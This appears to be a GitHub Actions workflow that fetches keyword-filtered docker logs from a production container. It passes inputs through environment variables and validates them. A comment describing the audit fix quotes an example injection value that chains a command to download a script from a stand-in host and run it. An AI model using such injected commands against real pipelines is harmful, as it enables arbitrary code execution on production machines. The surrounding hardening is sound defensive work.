name: Fetch production logs (diagnostic)

# One-off diagnostic tool: dumps recent app container logs, filtered to a
# keyword, into the workflow run output so they can be read via the GitHub
# API without SSH access to the production VM. Read-only — never touches
# running containers or app state. Gated behind the same "production"
# environment manual-approval used by deploy.yml, since it still executes on
# the production self-hosted runner.
on:
  workflow_dispatch:
    inputs:
      grep:
        description: "Keyword to filter logs by (case-insensitive, extended regex)"
        required: true
        default: "unlockResult|gps-refresh|unlock"
      since:
        description: "How far back to look (docker logs --since value, e.g. 2h, 30m)"
        required: true
        default: "2h"
      lines:
        description: "Max matching lines to print (most recent)"
        required: true
        default: "300"

permissions:
  contents: read

jobs:
  fetch-logs:
    name: Dump filtered app logs
    runs-on:
      - self-hosted
      - baltcircle-prod
    environment: production
    steps:
      # audit HIGH #4 fix: the previous version spliced raw workflow_dispatch
      # inputs directly into the run: script text via ${{ }}, so any of the
      # three fields could break out of its intended argument and execute
      # arbitrary shell on the prod runner (e.g. grep="; curl evil.sh | sh").
      # Fix: pass inputs only via env vars (never interpolated into script
      # text) and validate format/length before they're used at all.
      - name: Validate inputs
        env:
          GREP_PATTERN: ${{ github.event.inputs.grep }}
          SINCE: ${{ github.event.inputs.since }}
          LINES: ${{ github.event.inputs.lines }}
        run: |
          set -e
          if [ "${#GREP_PATTERN}" -gt 200 ] || [[ "$GREP_PATTERN" == *$'\n'* ]]; then
            echo "❌ grep pattern too long or contains newlines"
            exit 1
          fi
          if ! [[ "$SINCE" =~ ^[0-9]+[smh]$ ]]; then
            echo "❌ since must look like 30m, 2h, 45s — got: $SINCE"
            exit 1
          fi
          if ! [[ "$LINES" =~ ^[1-9][0-9]{0,3}$ ]]; then
            echo "❌ lines must be an integer between 1 and 9999 — got: $LINES"
            exit 1
          fi

      - name: Docker logs (filtered)
        env:
          GREP_PATTERN: ${{ github.event.inputs.grep }}
          SINCE: ${{ github.event.inputs.since }}
          LINES: ${{ github.event.inputs.lines }}
        run: |
          set -e
          echo "Container: baltcircle-mvp | since=$SINCE | grep=$GREP_PATTERN"
          echo "----------------------------------------------------------------"
          docker logs --since "$SINCE" baltcircle-mvp 2>&1 \
            | grep -iE "$GREP_PATTERN" \
            | tail -n "$LINES" \
            || echo "(no matching lines found)"
